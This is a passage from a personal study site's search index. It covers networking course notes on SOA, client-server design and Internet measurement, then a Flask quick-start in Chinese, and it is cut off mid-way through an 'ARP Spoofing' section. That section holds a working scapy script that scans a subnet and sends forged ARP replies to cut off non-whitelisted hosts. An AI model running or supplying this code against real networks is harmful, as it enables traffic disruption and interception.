ownership Service consumption Ownership vs. Usage Scalability Server addition Service composition Hardware vs. Logic"},{"location":"cs/network/w8/#soa-component-architecture","title":"SOA Component Architecture","text":"<pre><code>SOA Interaction Flow:\n\n1. Service Provider \u2500\u2500publishes\u2500\u2500\u25ba Service Registry\n                                      \u2502\n2. Service Requester \u2500\u2500discovers\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                     \u2502\n3.                   \u2514\u2500\u2500requests service\u2500\u2500\u25ba Service Provider\n                                              \u2502\n4.                   \u25c4\u2500\u2500service response\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"cs/network/w8/#service-characteristics-matrix","title":"Service Characteristics Matrix","text":"Characteristic Impact Implementation Benefit Provider Independence Vendor flexibility Standard interfaces Reduced lock-in Runtime Service Finding Dynamic discovery Registry protocols Adaptive systems Service Composition Modularity API orchestration Rapid development Pay-per-use Model Cost optimization Usage metering Resource efficiency Compact Applications Reduced complexity Microservices Maintainability Reactive/Adaptive Dynamic behavior Event-driven design Responsiveness"},{"location":"cs/network/w8/#hybrid-implementation-example","title":"Hybrid Implementation Example","text":"<pre><code>E-commerce Platform: SOA + Client-Server Hybrid\n\nClient-Server Components:\n\u251c\u2500\u2500 Web Frontend (Client)\n\u251c\u2500\u2500 Application Server\n\u2514\u2500\u2500 Database Server\n\nSOA Services:\n\u251c\u2500\u2500 Payment Processing Service (External)\n\u251c\u2500\u2500 Shipping Calculation Service (External)\n\u251c\u2500\u2500 Inventory Management Service (Internal)\n\u2514\u2500\u2500 User Authentication Service (Shared)\n\nService Registry:\n\u2022 API Gateway managing service discovery\n\u2022 Load balancing across service instances\n\u2022 Health monitoring and failover\n</code></pre>"},{"location":"cs/network/w8/#cost-performance-analysis","title":"Cost-Performance Analysis","text":"Architecture Setup Cost Operating Cost Flexibility Performance Pure Client-Server Low Medium Low High Pure SOA High Variable High Variable Hybrid Approach Medium Medium High Optimized"},{"location":"cs/network/w8/#calculation-example-soa-service-costs","title":"Calculation Example: SOA Service Costs","text":"<p>Scenario: E-commerce platform with SOA services</p> <pre><code>Monthly Service Cost Calculation:\n\nInternal Services (Fixed costs):\n\u2022 User Management: $500/month\n\u2022 Inventory System: $800/month\n\u2022 Order Processing: $600/month\nTotal Internal: $1,900/month\n\nExternal Services (Usage-based):\n\u2022 Payment Processing: $0.30 per transaction\n\u2022 Shipping API: $0.05 per lookup\n\u2022 Email Service: $0.001 per email\n\nUsage Example (10,000 transactions/month):\n\u2022 Payment: 10,000 \u00d7 $0.30 = $3,000\n\u2022 Shipping: 10,000 \u00d7 $0.05 = $500\n\u2022 Email: 15,000 \u00d7 $0.001 = $15\nTotal External: $3,515/month\n\nTotal SOA Cost: $1,900 + $3,515 = $5,415/month\n\nTraditional equivalent infrastructure: $8,000/month\nCost saving: $2,585/month (32% reduction)\n</code></pre>"},{"location":"cs/network/w8/#architecture-decision-framework","title":"Architecture Decision Framework","text":"Factor Client-Server Best SOA Best Hybrid Recommended Project Size Small-Medium Large-Enterprise Medium-Large Team Expertise Traditional IT DevOps/Cloud Mixed skills Budget Constraints Limited upfront Flexible operating Balanced approach Change Frequency Stable requirements Dynamic needs Moderate changes Integration Needs Internal systems External partners Mixed requirements"},{"location":"cs/network/w8/#exam-focused-summary","title":"Exam-Focused Summary","text":""},{"location":"cs/network/w8/#critical-decision-points-for-concept-questions","title":"Critical Decision Points for Concept Questions","text":""},{"location":"cs/network/w8/#architecture-selection-criteria","title":"Architecture Selection Criteria","text":"Requirement Recommended Architecture Justification Low latency, high performance Fat Client (2-tier) Local processing reduces network overhead Centralized data control Thin Client (2-tier) All logic and data on server Independent scaling needs Three-tier Separate scaling of presentation, logic, data External service integration SOA Registry-based discovery and composition Limited client resources Thin Client Minimal client-side requirements Offline capability needed Fat Client Local processing when disconnected"},{"location":"cs/network/w8/#performance-calculation-formulas","title":"Performance Calculation Formulas","text":""},{"location":"cs/network/w8/#network-load-calculation","title":"Network Load Calculation","text":"<pre><code>Total Network Traffic = (Requests/second) \u00d7 (Average Request Size) \u00d7 (Number of Clients)\n\nThin Client: High network traffic (all processing remote)\nFat Client: Lower network traffic (local processing)\nThree-tier: Optimized traffic (processing layer filters requests)\n</code></pre>"},{"location":"cs/network/w8/#scalability-metrics","title":"Scalability Metrics","text":"<pre><code>Scalability Factor = (Max Supported Users) / (Min Infrastructure Cost)\n\nClient-Server: Linear scaling (add servers)\nSOA: Exponential scaling (service composition)\n</code></pre>"},{"location":"cs/network/w8/#cost-benefit-analysis","title":"Cost-Benefit Analysis","text":"<pre><code>TCO = Infrastructure Cost + Development Cost + Maintenance Cost + Operating Cost\n\nROI = (Benefits - Total Costs) / Total Costs \u00d7 100%\n</code></pre>"},{"location":"cs/network/w8/#common-exam-scenarios","title":"Common Exam Scenarios","text":""},{"location":"cs/network/w8/#scenario-1-mobile-banking-app","title":"Scenario 1: Mobile Banking App","text":"<p>Question: Choose appropriate architecture for 100, 000 concurrent users</p> <p>Analysis: * High security requirements \u2192 Server-side processing * Mobile devices \u2192 Limited resources * Scalability critical \u2192 Independent layer scaling</p> <p>Answer: Three-tier architecture * Mobile app (Presentation) * API server cluster (Application) * Database cluster (Data)</p>"},{"location":"cs/network/w8/#scenario-2-real-time-gaming-platform","title":"Scenario 2: Real-time Gaming Platform","text":"<p>Question: Minimize latency for competitive gaming</p> <p>Analysis: * Ultra-low latency required \u2192 Local processing * Rich graphics \u2192 Client-side rendering * Game state synchronization \u2192 Server coordination</p> <p>Answer: Fat Client architecture * Game engine on client * State sync server * Optimized network protocols</p>"},{"location":"cs/network/w8/#scenario-3-enterprise-integration-platform","title":"Scenario 3: Enterprise Integration Platform","text":"<p>Question: Connect 50+ diverse systems</p> <p>Analysis: * Multiple vendors \u2192 Standard interfaces needed * Dynamic service requirements \u2192 Runtime discovery * Cost optimization \u2192 Pay-per-use model</p> <p>Answer: SOA architecture * Service registry for discovery * API gateway for integration * Microservices for modularity</p>"},{"location":"cs/network/w8/#key-formulas-for-calculations","title":"Key Formulas for Calculations","text":""},{"location":"cs/network/w8/#load-distribution-three-tier","title":"Load Distribution (Three-tier)","text":"<pre><code>Client Load = UI Processing + User Interaction\nApplication Server Load = Business Logic + API Processing\nDatabase Load = Query Processing + Data Storage\n\nTotal System Load = Sum of all tier loads\nBottleneck Tier = Tier with highest utilization ratio\n</code></pre>"},{"location":"cs/network/w8/#service-cost-optimization-soa","title":"Service Cost Optimization (SOA)","text":"<pre><code>Service Cost = Fixed Cost + (Usage \u00d7 Variable Rate)\nTotal SOA Cost = \u03a3(Individual Service Costs)\nBreak-even Point = Fixed Infrastructure Cost / Monthly SOA Savings\n</code></pre>"},{"location":"cs/network/w8/#fault-tolerance-calculation","title":"Fault Tolerance Calculation","text":"<pre><code>System Availability = \u03a0(Individual Component Availability)\nMTBF (Mean Time Between Failures) = 1 / Failure Rate\nRecovery Time = Detection Time + Switchover Time + Sync Time\n</code></pre>"},{"location":"cs/network/w9/","title":"9.0 Internet Measurement","text":"<p>This section covers the principles and techniques for measuring and understanding the Internet and other computer networks, focusing on core concepts and their implications rather than specific tool implementations or detailed techniques like sampling.</p>"},{"location":"cs/network/w9/#key-concept-relationships-and-comparative-analysis","title":"Key Concept Relationships and Comparative Analysis","text":""},{"location":"cs/network/w9/#measurement-paradigms-comparison-table","title":"Measurement Paradigms Comparison Table","text":"Aspect Passive Measurement Active Measurement Data Source Existing network traffic Artificially generated packets Network Impact Zero additional load Adds measurement traffic Use Case Production traffic analysis Specific property testing Information Type Real user behavior Controlled test conditions Examples SNMP polling, flow monitoring Ping, traceroute, bandwidth tests Accuracy High for actual usage High for specific metrics Privacy Concerns Higher (real user data) Lower (test data)"},{"location":"cs/network/w9/#network-abstraction-levels-hierarchy","title":"Network Abstraction Levels Hierarchy","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         AS Level (Organizations)         \u2502  \u2190 Policy, Economics\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502      Logical/Router Level (Routing)     \u2502  \u2190 Protocol, Performance  \n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502       Physical Level (Infrastructure)   \u2502  \u2190 Hardware, Geography\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n        \u2191 Increasing Abstraction \u2191\n</code></pre> <p>Common Characteristics Across Levels: * All levels face measurement challenges (privacy, data scarcity, heterogeneity) * All require graph theory metrics for analysis * All contribute to overall network understanding</p> <p>Key Differences: * Granularity: Physical (cables) \u2192 Router (hops) \u2192 AS (organizations) * Analysis Focus: Infrastructure \u2192 Performance \u2192 Policy * Measurement Complexity: Hardware monitoring \u2192 Protocol analysis \u2192 Economic modeling</p>"},{"location":"cs/network/w9/#1-motivation-and-importance-of-internet-measurement","title":"1. Motivation and Importance of Internet Measurement","text":""},{"location":"cs/network/w9/#core-motivations-framework","title":"Core Motivations Framework","text":"<pre><code>Internet Measurement Motivations\n\u251c\u2500\u2500 Technical Improvements\n\u2502   \u251c\u2500\u2500 Understanding network behavior\n\u2502   \u251c\u2500\u2500 Identifying and solving problems\n\u2502   \u2514\u2500\u2500 Performance optimization\n\u251c\u2500\u2500 Operational Benefits  \n\u2502   \u251c\u2500\u2500 Better network operations\n\u2502   \u251c\u2500\u2500 Pricing and billing accuracy\n\u2502   \u2514\u2500\u2500 Security monitoring\n\u2514\u2500\u2500 Research &amp; Innovation\n    \u251c\u2500\u2500 Scientific discovery\n    \u251c\u2500\u2500 Model creation for experiments\n    \u2514\u2500\u2500 Identifying new phenomena\n</code></pre> <p>Societal Impact Dimensions: * Technical: Performance, resilience, security analysis * Economic: Pricing models, traffic discrimination * Political: State censorship, regulation compliance * Social: Social media impact, information spread patterns</p>"},{"location":"cs/network/w9/#2-challenges-in-internet-measurement","title":"2. Challenges in Internet Measurement","text":""},{"location":"cs/network/w9/#challenge-categories-and-interconnections","title":"Challenge Categories and Interconnections","text":"<pre><code>Design Challenges \u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u251c\u2500\u2500 Not designed for measurement     \u2502\n\u251c\u2500\u2500 Side-effect exploitation         \u2502  Fundamental\n\u2514\u2500\u2500 \"Artful piling of hacks\"        \u2502  Limitations\n                                    \u2502\nData Challenges \u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u251c\u2500\u2500 Lack of ground truth\n\u251c\u2500\u2500 Data scarcity and sensitivity\n\u2514\u2500\u2500 Privacy and ethical concerns\n\nNetwork Challenges\n\u251c\u2500\u2500 Heterogeneity (devices, technologies, IoT)\n\u251c\u2500\u2500 Limited result generalizability  \n\u2514\u2500\u2500 Temporal variability (failures, disasters)\n</code></pre> <p>Challenge Interdependencies: * Design \u2192 Data: Poor measurability design leads to data quality issues * Data \u2192 Network: Limited data availability compounds heterogeneity problems Network \u2192 Design:* Dynamic changes require adaptive measurement approaches</p>"},{"location":"cs/network/w9/#3-layers-of-measurement","title":"3. Layers of Measurement","text":""},{"location":"cs/network/w9/#network-stack-measurement-matrix","title":"Network Stack Measurement Matrix","text":"Layer Focus Area Measurement Targets Performance Metrics Higher (Layer 8+) Social/Context News propagation, social networks Spread rate, influence metrics Transport (Layer 4) Protocol Performance TCP/UDP behavior, congestion Throughput, reliability Network (Layer 3) Routing &amp; Topology Path discovery, failure analysis Latency, packet loss Physical (Layer 1-2) Infrastructure Cables, device connectivity Bandwidth, RTT, availability <p>Cross-Layer Dependencies: * Application performance requires analysis across all layers to identify bottlenecks * Physical connectivity heavily influences routing, bandwidth, delay, and RTT * Layers 4-5 downwards primarily focus on performance-related metrics</p>"},{"location":"cs/network/w9/#4-network-structure-graph-theory-metrics","title":"4. Network Structure (Graph Theory Metrics)","text":""},{"location":"cs/network/w9/#graph-theory-foundations","title":"Graph Theory Foundations","text":"<p>A network can be viewed as a graph, consisting of nodes (devices) and edges (connections). Graph theory concepts can be applied to understand network structure.</p>"},{"location":"cs/network/w9/#key-metrics-comparison-and-calculation","title":"Key Metrics Comparison and Calculation","text":"Metric Formula Range Interpretation Use Case Degree Distribution P(k) P(k) = Nk / N [0, 1] Probability of k connections Network resilience analysis Distance (Shortest Path) Count of edges in shortest path [1, \u221e] Communication efficiency Latency prediction Diameter max(distance(i, j)) for all pairs [1, \u221e] Worst-case path length Network span analysis Average Path Length \u03a3distance(i, j) / total_pairs [1, diameter] Typical communication cost Overall efficiency Clustering Coefficient Ci = 2Ei / (ki(ki-1)) [0, 1] Local interconnectedness Local efficiency"},{"location":"cs/network/w9/#worked-example-clustering-coefficient-calculation","title":"Worked Example: Clustering Coefficient Calculation","text":"<p>Given Network:</p> <pre><code>Node A connects to: B, C, D\nNode B connects to: A, C\nNode C connects to: A, B, D  \nNode D connects to: A, C\n</code></pre> <p>For Node A: * Degree (kA) = 3 (connects to B, C, D) * Neighbors: B, C, D * Edges between neighbors (EA): B-C, C-D = 2 edges * CA = 2EA / (kA(kA-1)) = 2(2) / (3\u00d72) = 4/6 = 0.67</p> <p>Interpretation: Node A's neighbors are 67% interconnected, indicating good local connectivity.</p>"},{"location":"cs/network/w9/#network-characteristics-patterns","title":"Network Characteristics Patterns","text":"<p>Typical Large Network Properties: * Degree Distribution: Many nodes have low degree, few have very high degree (scale-free) * Path Properties: Short average path lengths despite large network size (small-world) * Clustering: Higher than random networks due to local community structures</p>"},{"location":"cs/network/w9/#5-internet-topology-measurement-levels","title":"5. Internet Topology Measurement (Levels)","text":""},{"location":"cs/network/w9/#topology-abstraction-levels","title":"Topology Abstraction Levels","text":"<p>Topology measurement aims to model the Internet accurately and observe trends in interconnectivity across different conceptual levels:</p> <pre><code>Internet Topology Hierarchy\n\nAS Level (Autonomous Systems)\n\u251c\u2500\u2500 Focus: Inter-organizational connections\n\u251c\u2500\u2500 Granularity: ISPs, corporations, universities\n\u251c\u2500\u2500 Applications: Policy analysis, economic modeling\n\u2514\u2500\u2500 Dependencies: Relies on router-level information\n\n        \u2195 Information Flow \u2195\n\nRouter/Logical Level  \n\u251c\u2500\u2500 Focus: Information flow paths\n\u251c\u2500\u2500 Granularity: Individual routers and links\n\u251c\u2500\u2500 Applications: Performance optimization, routing\n\u2514\u2500\u2500 Dependencies: Relies on physical connectivity\n\n        \u2195 Information Flow \u2195\n\nPhysical Level\n\u251c\u2500\u2500 Focus: Actual infrastructure  \n\u251c\u2500\u2500 Granularity: Cables, devices, geographic locations\n\u251c\u2500\u2500 Applications: Reliability analysis, capacity planning\n\u2514\u2500\u2500 Dependencies: Hardware monitoring and geographic data\n</code></pre>"},{"location":"cs/network/w9/#level-comparison-matrix","title":"Level Comparison Matrix","text":"Aspect Physical Level Router Level AS Level Entities Cables, devices Routers, logical links Organizations, ISPs Analysis Focus Infrastructure reliability Protocol performance Economic relationships Failure Impact Component outages Routing disruptions Policy changes Measurement Tools Hardware monitoring Protocol analysis BGP data, agreements Timescale Hardware lifecycles Protocol updates Business relationships <p>Key Principle: As you move up the layers (Physical \u2192 AS), you rely on information from lower layers and become less concerned with their specific details.</p>"},{"location":"cs/network/w9/#6-types-of-measurement","title":"6. Types of Measurement","text":""},{"location":"cs/network/w9/#measurement-approach-taxonomy","title":"Measurement Approach Taxonomy","text":"<pre><code>Network Measurement Approaches\n\nPassive Measurement                    Active Measurement\n\u251c\u2500\u2500 Method: Observe existing traffic   \u251c\u2500\u2500 Method: Generate test traffic\n\u251c\u2500\u2500 Impact: Zero network load         \u251c\u2500\u2500 Impact: Adds measurement overhead  \n\u251c\u2500\u2500 Data: Real user behavior          \u251c\u2500\u2500 Data: Controlled test conditions\n\u2514\u2500\u2500 Applications:                     \u2514\u2500\u2500 Applications:\n    \u251c\u2500\u2500 Traffic analysis                  \u251c\u2500\u2500 Performance testing\n    \u251c\u2500\u2500 Usage patterns                    \u251c\u2500\u2500 Topology discovery  \n    \u251c\u2500\u2500 Billing verification              \u251c\u2500\u2500 Capacity planning\n    \u2514\u2500\u2500 Security monitoring               \u2514\u2500\u2500 SLA verification\n</code></pre>"},{"location":"cs/network/w9/#snmp-simple-network-management-protocol-analysis","title":"SNMP (Simple Network Management Protocol) Analysis","text":"<p>SNMP Framework: * Purpose: Network management services for data collection and configuration * Structure: Management Information Base (MIB) defines data organization * Operation: Router polling for counter data (bytes, packets) * Applications: Billing, anomaly detection, trend analysis</p> <p>SNMP Capabilities vs Limitations:</p> Capability Description Limitation Impact Counter Collection Byte/packet counts per interface Aggregate Data Only Cannot identify traffic types Periodic Polling Regular data collection (e.g., 5 min) Limited Granularity May miss short-term events Anomaly Detection Identify unusual traffic patterns No Traffic Details Cannot determine attack types Trend Analysis Long-term usage patterns No Source/Destination Limited security analysis <p>MRTG (Multi Router Traffic Grapher): * Visualizes SNMP data as time series plots * Effective for identifying bandwidth anomalies and trends * Can indicate security issues (e.g., DDoS attacks) through traffic spikes</p>"},{"location":"cs/network/w9/#7-flow-and-traffic-matrix-concepts","title":"7. Flow and Traffic Matrix Concepts","text":""},{"location":"cs/network/w9/#flow-analysis-framework","title":"Flow Analysis Framework","text":"<p>To understand network behavior comprehensively, we need to analyze traffic flow patterns beyond simple SNMP counters.</p>"},{"location":"cs/network/w9/#flow-definition-and-characteristics","title":"Flow Definition and Characteristics","text":"<p>Flow: A unidirectional stream of packets between source and destination with specific identifying characteristics:</p> <pre><code>Flow Identification Parameters:\n\u251c\u2500\u2500 Network Layer (Layer 3)\n\u2502   \u251c\u2500\u2500 Source IP Address\n\u2502   \u251c\u2500\u2500 Destination IP Address  \n\u2502   \u2514\u2500\u2500 Protocol Type (TCP/UDP/ICMP)\n\u251c\u2500\u2500 Transport Layer (Layer 4)\n\u2502   \u251c\u2500\u2500 Source Port Number\n\u2502   \u2514\u2500\u2500 Destination Port Number\n\u2514\u2500\u2500 Interface Information\n    \u2514\u2500\u2500 Input Interface ID\n</code></pre>"},{"location":"cs/network/w9/#flow-vs-snmp-comparison","title":"Flow vs SNMP Comparison","text":"Aspect SNMP Counters Flow Records Granularity Interface-level aggregates Per-connection details Traffic Visibility Total bytes/packets Application-specific flows Analysis Capability Bandwidth trends Application breakdown Protocol Support Interface-agnostic Protocol-aware Security Analysis Basic anomaly detection Detailed attack analysis"},{"location":"cs/network/w9/#flow-record-structure-and-applications","title":"Flow Record Structure and Applications","text":"<p>Flow Record Components: * Identification: Source/destination IPs, ports, protocol * Counters: Byte and packet counts per flow * Protocol Data: TCP flags, ToS bits * Timing: First and last packet timestamps * Interface: Ingress interface information</p> <p>Protocol-Specific Considerations: * TCP Flows: Connection-oriented, easier to track (clear start/end) * UDP Flows: Connectionless, may take different routes, harder to track</p>"},{"location":"cs/network/w9/#traffic-matrix-construction","title":"Traffic Matrix Construction","text":"<p>Traffic Matrix: Represents data transmission volumes between every pair of network nodes (subnets)</p> <pre><code>Traffic Matrix Example (simplified):\n\n        Destination Subnets\n        A    B    C    D\nSource A [0   15   8    3 ]  Gbps\nSubnets B [12   0   22   7 ]\n        C [5    18   0   11]  \n        D [9    4    6    0 ]\n</code></pre> <p>Applications: * Application Breakdown: Identify traffic by service (web traffic via TCP port 80) * Flow Counting: Monitor active connections per application * Capacity Planning: Understand inter-subnet communication patterns * Security Analysis: Detect unusual communication patterns</p>"},{"location":"cs/network/w9/#flow-aggregation-strategy","title":"Flow Aggregation Strategy","text":"<p>Purpose: Reduce data volume while preserving analytical value</p> <p>Benefits: * Data Reduction: Minimize export data volume Memory Efficiency: Lower router memory requirements * Reliability: Avoid packet loss during traffic spikes * Processing:* Router-side aggregation before analysis</p> <p>Challenge: Building accurate traffic matrices remains a non-trivial problem requiring sophisticated aggregation and estimation techniques.</p>"},{"location":"cs/network/w9/#exam-preparation-key-calculation-examples","title":"Exam Preparation: Key Calculation Examples","text":""},{"location":"cs/network/w9/#example-1-graph-theory-metrics-calculation","title":"Example 1: Graph Theory Metrics Calculation","text":"<p>Scenario: Small network with 5 nodes (A, B, C, D, E)</p> <p>Connections: * A connects to: B, C * B connects to: A, C, D * C connects to: A, B, D, E * D connects to: B, C, E * E connects to: C, D</p> <p>Calculate:</p> <ol> <li> <p>Degree Distribution P(k):    - Degree 2: A (1 node) \u2192 P(2) = 1/5 = 0.2    - Degree 3: B, D, E (3 nodes) \u2192 P(3) = 3/5 = 0.6    - Degree 4: C (1 node) \u2192 P(4) = 1/5 = 0.2</p> </li> <li> <p>Clustering Coefficient for Node C:    - Neighbors: A, B, D, E (degree = 4)    - Edges between neighbors: A-B, B-D, D-E = 3    - CC = 2(3) / (4\u00d73) = 6/12 = 0.5</p> </li> <li> <p>Network Diameter:    - Find all shortest paths, identify maximum    - A to E: A\u2192C\u2192E (distance = 2)    - All pairs have distance \u2264 2    - Diameter = 2</p> </li> </ol>"},{"location":"cs/network/w9/#example-2-flow-analysis-scenario","title":"Example 2: Flow Analysis Scenario","text":"<p>Given: Router observes traffic for 1 hour with following flow data:</p> Flow Src IP Dst IP Protocol Src Port Dst Port Bytes Packets 1 10.1.1.5 192.168.1.10 TCP 12345 80 150MB 120, 000 2 10.1.1.8 192.168.1.10 TCP 23456 80 75MB 60, 000 3 10.1.1.5 192.168.1.20 UDP 34567 53 2MB 1, 500 <p>Analysis Questions: 1. Application Breakdown: How much web traffic (port 80)?    - Web traffic = Flow 1 + Flow 2 = 150MB + 75MB = 225MB</p> <ol> <li> <p>Flow Counting: How many active web connections?    - TCP port 80 connections = 2 flows</p> </li> <li> <p>Traffic Matrix (subnet level):    - 10.1.1.0/24 \u2192 192.168.1.0/24: 227MB total    - DNS queries: 2MB (UDP port 53)</p> </li> </ol> <p>Key Insight: Flow analysis provides detailed application visibility that SNMP counters cannot deliver.</p>"},{"location":"cs/python/flask/1.0/","title":"1.0 Quick Start","text":""},{"location":"cs/python/flask/1.0/#theory","title":"Theory","text":"<ul> <li>Client-Side = Restaurant</li> <li>Server = Kitchen</li> <li>Database = Larder</li> </ul> <p>\u7f51\u7ad9\u5c31\u50cf\u4e00\u5bb6\u9910\u5385\uff0c\u670d\u52a1\u5458\u548c\u53a8\u5e08\u4ece\u6570\u636e\u5e93\u4e2d\u62ff\u53d6\u6570\u636e\u8fdb\u884c\u52a0\u5de5\u6e32\u67d3\u91cd\u65b0\u7ec4\u5408\u6210\u65b0\u7684 HTML CSS \u548c JS \u6587\u4ef6\u5448\u73b0\u7ed9\u7528\u6237</p> <ul> <li>Framework \u548c Library \u6700\u5927\u7684\u533a\u522b\u5c31\u662f\u4f60\u5fc5\u987b\u6309\u7167\u6846\u67b6\u7684\u89c4\u5219\u8fdb\u884c\u7f16\u7a0b</li> </ul>"},{"location":"cs/python/flask/1.0/#basics","title":"Basics","text":"Flask Import<pre><code>from flask import Flask\n\napp = Flask(__name__)\n\nprint(__name__) # (1)!\n</code></pre> <p>Flask \u5f53\u4e2d\u7684 <code>__name__</code> \u7528\u4e8e\u786e\u5b9a\u5e94\u7528\u5f53\u524d\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u5982\u679c\u76f4\u63a5\u6253\u5370 <code>__name__</code> \u4f1a\u663e\u793a <code>__main__</code> </p> <p><code>__main__</code> is the name of the scope in which top-level code executes. A module's <code>__name__</code> is set equal to <code>__main__</code> when read from standard input, a script, or from an interactive prompt.</p> <pre><code>if __name__ = \"__main__\":\n    main()\n</code></pre> <p>\u53ea\u6709\u5f53\u5b83\u4f5c\u4e3a\u4e00\u4e2a\u811a\u672c\u8fd0\u884c\u65f6\u624d\u4f1a\u6267\u884c</p>"},{"location":"cs/python/flask/1.0/#_1","title":"\u8def\u7531","text":"<p>\u5ba2\u6237\u7aef\uff08\u4f8b\u5982 Web \u6d4f\u89c8\u5668\uff09\u628a\u8bf7\u6c42\u53d1\u9001\u7ed9 Web \u670d\u52a1\u5668\uff0cWeb \u670d\u52a1\u5668\u518d\u628a\u8bf7\u6c42\u53d1\u9001\u7ed9 Flask \u5e94\u7528\u5b9e\u4f8b\u3002\u5e94\u7528\u5b9e\u4f8b\u9700\u8981\u77e5\u9053\u5bf9\u6bcf\u4e2a URL \u7684\u8bf7\u6c42\u8981\u8fd0\u884c\u54ea\u4e9b\u4ee3\u7801\uff0c\u6240\u4ee5\u4fdd\u5b58\u4e86\u4e00\u4e2a URL \u5230 Python \u51fd\u6570\u7684\u6620\u5c04\u5173\u7cfb\u3002\u5904\u7406 URL \u548c\u51fd\u6570\u4e4b\u95f4\u5173\u7cfb\u7684\u7a0b\u5e8f\u79f0\u4e3a\u8def\u7531\u3002</p> <pre><code>@app.route('/')\ndef index():\n    return 'Hello World!'\n\n@app.route('/user/&lt;name&gt;')\ndef user(name):\n    return 'Hello, {}!'.format(name)\n</code></pre> <p>\u5c16\u62ec\u53f7\u91cc\u7684\u5185\u5bb9\u5c31\u662f\u52a8\u6001\u90e8\u5206\uff0cFlask \u4f1a\u5c06\u52a8\u6001\u90e8\u5206\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u51fd\u6570\uff1a</p> <p>\u8def\u7531 <code>/user/&lt;int:id&gt;</code> \u53ea\u4f1a\u5339\u914d\u52a8\u6001\u7247\u6bb5\uff0c\u8def\u7531\u4e2d\u652f\u6301 string, float \u548c path \u7c7b\u578b</p>"},{"location":"cs/python/flask/1.0/#python-decorators","title":"Python Decorators","text":"<pre><code># Functions can be nested in other functions\n\ndef outer_function():\n    print(\"I'm outer\")\n\n    def nested_function():\n        print(\"I'm inner\")\n\n    nested_function()  \nouter_function()\n\n# Functions can be returned from other functions\n\ndef outer_function():\n    print(\"I'm outer\")\n\n    def nested_function():\n        print(\"I'm inner\")\n    return nested_function\n\ninner_function = outer_function()\ninner_function()\n</code></pre>"},{"location":"cs/python/flask/1.0/#_2","title":"\u542f\u52a8\u65b9\u6cd5","text":"<p>\u6307\u4ee4\u884c\u542f\u52a8\uff1a</p> <pre><code>set FLASK_APP=hello.py\nflask run\n</code></pre> <p>\u5355\u5143\u6d4b\u8bd5\u8c03\u8bd5\uff1a</p> <pre><code>set FLASK_APP=hello.py\nset FLASK_DEBUG=1\nflask run\n</code></pre> <p>\u6216\u5728\u4ee3\u7801\u5185\u90e8\u76f4\u63a5\u5b9a\u4e49\u8c03\u8bd5</p> <pre><code>if __name__ == '__main__':\n    app.run(debug=True)\n</code></pre> <p>\u91cd\u8f7d\u5668\u548c\u8c03\u8bd5\u5668\u4f1a\u81ea\u52a8\u68c0\u6d4b\u4ee3\u7801\u53d8\u52a8\u5728 Web \u7aef\u629b\u51fa\u5f02\u5e38</p> <p><code>flask run</code> \u7684\u8be6\u7ec6\u62d3\u5c55\u53c2\u6570\u76f4\u63a5\u8f93\u5165 <code>flask --help</code> \u76f4\u63a5\u67e5\u770b\u5373\u53ef</p>"},{"location":"cyber/networkattack/","title":"Network Attacks","text":""},{"location":"cyber/networkattack/#arp-spoofing","title":"Arp Spoofing","text":""},{"location":"cyber/networkattack/#python-script","title":"Python Script","text":"<p>\u57fa\u4e8e\u767d\u540d\u5355\u5217\u8868\u8fdb\u884c ARP IP \u6bb5\u6d41\u91cf\u963b\u65ad</p> <pre><code>import scapy.all as scapy\nimport time\n\ndef scan_network(ip_range):\n    arp_request = scapy.ARP(pdst=ip_range)\n    broadcast = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n    arp_request_broadcast = broadcast / arp_request\n    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]\n    active_ips = []\n    for element in answered_list:\n        active_ips.append(element[1].psrc)\n    return active_ips\n\ndef get_mac(ip):\n    arp_request = scapy.ARP(pdst=ip)\n    broadcast = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n    arp_request_broadcast = broadcast / arp_request\n    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]\n    if answered_list:\n        return answered_list[0][1].hwsrc\n    else:\n        return None\n\ndef spoof(target_ip, spoof_ip):\n    target_mac = get_mac(target_ip)\n    if target_mac is not None:\n        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)\n        scapy.send(packet, verbose=False)\n\ndef restore(destination_ip, source_ip):\n    destination_mac = get_mac(destination_ip)\n    source_mac = get_mac(source_ip)\n    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)\n    scapy.send(packet, verbose=False)\n\n# Replace these with the actual IP range and exclusion list\nip_range = \"192.168.1.0/24\"\ngateway_ip = \"192.168.1.1\"\nexclusion_list = [\"192.168.1.1\", \"192.168.1.4\", \"192.168.1.6\"]\n\ntry:\n    active_ips = 